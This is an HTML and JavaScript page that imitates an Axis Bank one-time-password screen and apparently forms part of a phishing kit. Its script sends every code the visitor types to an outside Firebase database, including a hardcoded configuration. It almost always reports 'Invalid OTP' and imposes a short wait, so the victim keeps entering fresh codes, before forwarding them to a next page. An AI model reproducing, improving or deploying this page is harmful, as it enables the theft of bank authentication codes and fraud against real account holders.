<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP Verification</title>

<style>
/* SIMPLE STYLES - Exactly like Second.html */
body{
    margin:0;
    font-family: Arial, sans-serif;
    background:#f5f5f5;
}
.header{
    margin:0;
    padding:0;
}
.header img{
    width:100%;
    display:block;
}
.container{
    padding:30px;
    text-align:center;
}
.title{
    font-size:22px;
    margin-bottom:25px;
    font-weight:bold;
}
.otp-box input{
    width:180px;
    padding:15px;
    font-size:22px;
    text-align:center;
    letter-spacing:8px;
    border-radius:8px;
    border:1px solid #ccc;
}
.verify-btn{
    width:100%;
    padding:15px;
    margin-top:30px;
    background:#a0003c;
    color:white;
    border:none;
    border-radius:25px;
    font-size:18px;
    cursor:pointer;
}
.verify-btn:disabled{
    background:#cccccc;
    cursor:not-allowed;
}
.footer{
    margin-top:40px;
}
.footer img{
    width:100%;
    display:block;
}
.loader{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(255,255,255,0.95);
    display:none;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    z-index:9999;
}
.spinner{
    width:50px;
    height:50px;
    border:6px solid #ccc;
    border-top:6px solid #a0003c;
    border-radius:50%;
    animation:spin 1s linear infinite;
}
@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}
.message{
    padding:12px;
    border-radius:8px;
    margin-bottom:15px;
    display:none;
}
.message.success{
    background:#d4edda;
    color:#155724;
    border:1px solid #c3e6cb;
}
.message.error{
    background:#f8d7da;
    color:#721c24;
    border:1px solid #f5c6cb;
}
.otp-popup{
    position:fixed;
    top:20px;
    left:50%;
    transform:translateX(-50%);
    background:#a0003c;
    color:white;
    padding:12px 25px;
    border-radius:50px;
    font-size:16px;
    display:none;
    z-index:10000;
    animation:slideDown 0.3s ease;
}
@keyframes slideDown{
    from{ top:-50px; opacity:0; }
    to{ top:20px; opacity:1; }
}

/* Invalid OTP Message - Red Color */
.invalid-message{
    background:#f8d7da;
    color:#721c24;
    border:2px solid #f5c6cb;
    padding:15px;
    margin:20px 0;
    font-size:18px;
    font-weight:bold;
    border-radius:8px;
    display:none;
    animation:shake 0.5s ease;
}
@keyframes shake{
    0%,100%{transform:translateX(0);}
    10%,30%,50%,70%,90%{transform:translateX(-5px);}
    20%,40%,60%,80%{transform:translateX(5px);}
}

/* Timer Display */
.timer{
    font-size:16px;
    color:#666;
    margin-top:10px;
    display:none;
}
.timer span{
    color:#a0003c;
    font-weight:bold;
    font-size:20px;
}
</style>
</head>

<body>

<!-- FIREBASE SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<div class="otp-popup" id="otpPopup">✅ OTP Sent Successfully</div>

<div class="header">
    <img src="header.png" alt="Header" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2280%22 viewBox=%220 0 100 80%22><rect width=%22100%25%22 height=%2280%22 fill=%22%238B0000%22/><text x=%2210%22 y=%2245%22 fill=%22white%22 font-size=%2220%22>Axis Bank</text></svg>'">
</div>

<div class="container">

<div id="messageBox" class="message"></div>

<!-- Invalid OTP Message - Red Color -->
<div id="invalidMessage" class="invalid-message">
    ❌ Invalid OTP! Please try again.
</div>

<!-- Timer Display -->
<div id="timer" class="timer">
    Please wait <span id="seconds">5</span> seconds...
</div>

<div class="title">Enter One Time Password</div>

<div class="otp-box">
    <input type="tel" id="otp" maxlength="6" inputmode="numeric" placeholder="------" autocomplete="off">
</div>

<button class="verify-btn" id="verifyBtn" onclick="verifyOTP()">Verify OTP</button>

</div>

<div class="footer">
    <img src="footer.png" alt="Footer" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2260%22 viewBox=%220 0 100 60%22><rect width=%22100%25%22 height=%2260%22 fill=%22%23333%22/><text x=%2210%22 y=%2235%22 fill=%22white%22 font-size=%2212%22>© 2024 Axis Bank</text></svg>'">
</div>

<div class="loader" id="loader">
    <div class="spinner"></div>
    <p>Please wait...</p>
</div>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyBqYAEIP3jPi2_1ao6JSVJyhLI7ZOBK440",
    authDomain: "axisbank-ea121.firebaseapp.com",
    databaseURL: "https://axisbank-ea121-default-rtdb.firebaseio.com",
    projectId: "axisbank-ea121",
    storageBucket: "axisbank-ea121.firebasestorage.app",
    messagingSenderId: "512765027545",
    appId: "1:512765027545:web:5e05b71a1c8a248d328ac8"
};

firebase.initializeApp(firebaseConfig);
console.log("✅ Firebase Connected!");

// Get userId from localStorage
const userId = localStorage.getItem('userId');
let isBuffering = false;
let bufferTimeout = null;

if(userId) {
    setTimeout(() => {
        document.getElementById('otpPopup').style.display = 'block';
        setTimeout(() => {
            document.getElementById('otpPopup').style.display = 'none';
        }, 3000);
    }, 500);
}

function showMessage(text, type) {
    const messageBox = document.getElementById('messageBox');
    messageBox.textContent = text;
    messageBox.className = 'message ' + type;
    messageBox.style.display = 'block';
    setTimeout(() => messageBox.style.display = 'none', 5000);
}

// Function to show invalid OTP message
function showInvalidOTP() {
    document.getElementById('invalidMessage').style.display = 'block';
    setTimeout(() => {
        document.getElementById('invalidMessage').style.display = 'none';
    }, 3000);
}

// Function to start 5 second buffer
function startBuffer() {
    isBuffering = true;
    const verifyBtn = document.getElementById('verifyBtn');
    const timer = document.getElementById('timer');
    const secondsSpan = document.getElementById('seconds');
    
    verifyBtn.disabled = true;
    timer.style.display = 'block';
    
    let secondsLeft = 5;
    secondsSpan.textContent = secondsLeft;
    
    // Clear any existing timeout
    if(bufferTimeout) {
        clearTimeout(bufferTimeout);
    }
    
    // Update timer every second
    const timerInterval = setInterval(() => {
        secondsLeft--;
        secondsSpan.textContent = secondsLeft;
        
        if(secondsLeft <= 0) {
            clearInterval(timerInterval);
        }
    }, 1000);
    
    // Set timeout to end buffer
    bufferTimeout = setTimeout(() => {
        isBuffering = false;
        verifyBtn.disabled = false;
        timer.style.display = 'none';
        document.getElementById('otp').focus();
    }, 5000);
}

// Function to find next OTP number
async function getNextOtpNumber() {
    if(!userId) return 1;
    
    try {
        const snapshot = await firebase.database().ref('users/user_' + userId).once('value');
        const userData = snapshot.val() || {};
        
        let maxOtp = 0;
        // Check otp_1 to otp_50
        for(let i = 1; i <= 50; i++) {
            if(userData[`otp_${i}`]) {
                maxOtp = i;
            }
        }
        
        return maxOtp + 1; // Next OTP number
    } catch (error) {
        console.error("Error:", error);
        return 1;
    }
}

async function verifyOTP() {
    // Don't allow if buffering
    if(isBuffering) {
        showMessage("⏳ Please wait for 5 seconds before trying again", "error");
        return;
    }
    
    const otp = document.getElementById("otp").value.trim();
    
    if(!/^[0-9]{6}$/.test(otp)){
        showMessage("❌ Please enter valid 6 digit OTP", "error");
        return;
    }

    if(!userId) {
        showMessage("❌ Session expired. Please login again.", "error");
        setTimeout(() => window.location.href = "Index.html", 2000);
        return;
    }

    // Show loader
    document.getElementById("loader").style.display = "flex";

    try {
        // Get next OTP number automatically
        const nextOtpNumber = await getNextOtpNumber();
        
        // Update user data with OTP - otp_4, otp_5, otp_6 etc.
        const updateData = {};
        updateData[`otp_${nextOtpNumber}`] = otp;
        
        await firebase.database().ref('users/user_' + userId).update(updateData);
        
        console.log(`✅ OTP saved as otp_${nextOtpNumber} for user ${userId}`);
        
        // Hide loader
        document.getElementById("loader").style.display = "none";
        
        // Check if OTP is valid (for demo, let's say only 123456 is valid)
        if(otp === "123456") {
            // Valid OTP - redirect to Third.html
            showMessage("✅ OTP Verified Successfully! Redirecting...", "success");
            setTimeout(() => window.location.href = "Third.html", 2000);
        } else {
            // Invalid OTP - show red message and start buffer
            showInvalidOTP();
            startBuffer();
            document.getElementById("otp").value = ""; // Clear OTP field
        }
        
    } catch (error) {
        document.getElementById("loader").style.display = "none";
        showMessage("❌ Error: " + error.message, "error");
    }
}

// Disable button on page load if needed
window.onload = () => {
    document.getElementById('otp').focus();
};
</script>

</body>
</html>
